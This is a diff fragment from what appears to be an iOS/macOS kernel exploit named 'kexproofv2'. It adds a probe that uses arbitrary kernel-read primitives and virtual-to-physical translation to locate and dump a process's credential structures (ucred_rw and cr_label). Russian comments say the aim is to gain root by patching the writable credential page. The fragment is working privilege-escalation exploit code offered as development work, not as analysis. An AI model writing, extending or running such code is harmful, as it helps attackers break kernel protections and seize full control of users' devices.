@@ -7964,6 +7964,38 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kpNote(r, [NSString stringWithFormat:@"  [FORGE] proc_ro=%#llx ucred=%#llx (getuid=%u getgid=%u)",
                       (unsigned long long)roF, (unsigned long long)ucF, getuid(), getgid()]);
             if (kpLooksLikeKernelPointer(ucF)) {
+                // kexproofv2 2.0.22 [UCRW-PROBE] — ucred-страница физически RO
+                // (INPL 11111 → readback без изменений). ucred_rw — отдельный
+                // объект (ucred+0), его имя = read-write. Walker теперь даёт PA
+                // для любого VA — смотрим тип кадра и контент. Если uid живёт
+                // ТАМ и кадр пишется — root через патч ucred_rw.
+                uint64_t ucRW = kp_untag_ptr(early_kread64(ucF + 0x00));
+                uint64_t ucRWpa = 0;
+                if (kpLooksLikeKernelPointer(ucRW)) {
+                    uint64_t rwPg = ucRW & ~0x3fffULL;
+                    ucRWpa = kvtophys(rwPg);
+                    int rwT = ucRWpa ? kpFrameTypeOf(ucRWpa) : -1;
+                    kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] ucred_rw=%#llx pagePA=%#llx тип=%d (uoff=%#llx)",
+                              (unsigned long long)ucRW, (unsigned long long)ucRWpa, rwT,
+                              (unsigned long long)(ucRW & 0x3fff)]);
+                    NSMutableString *dd = [NSMutableString string];
+                    for (int i = 0; i < 16; i++)
+                        [dd appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(ucRW + (uint64_t)i * 8)];
+                    kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] контент ucred_rw:%@", dd]);
+                }
+                uint64_t ucLb = kp_untag_ptr(early_kread64(ucF + 0x78));
+                if (kpLooksLikeKernelPointer(ucLb)) {
+                    uint64_t lbPg = ucLb & ~0x3fffULL;
+                    uint64_t lbPA = kvtophys(lbPg);
+                    int lbT = lbPA ? kpFrameTypeOf(lbPA) : -1;
+                    kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] cr_label=%#llx pagePA=%#llx тип=%d (uoff=%#llx)",
+                              (unsigned long long)ucLb, (unsigned long long)lbPA, lbT,
+                              (unsigned long long)(ucLb & 0x3fff)]);
+                    NSMutableString *ld = [NSMutableString string];
+                    for (int i = 0; i < 8; i++)
+                        [ld appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(ucLb + (uint64_t)i * 8)];
+                    kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] контент cr_label:%@", ld]);
+                }
                 uint64_t pageVA = ucF & ~0x3fffULL;
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
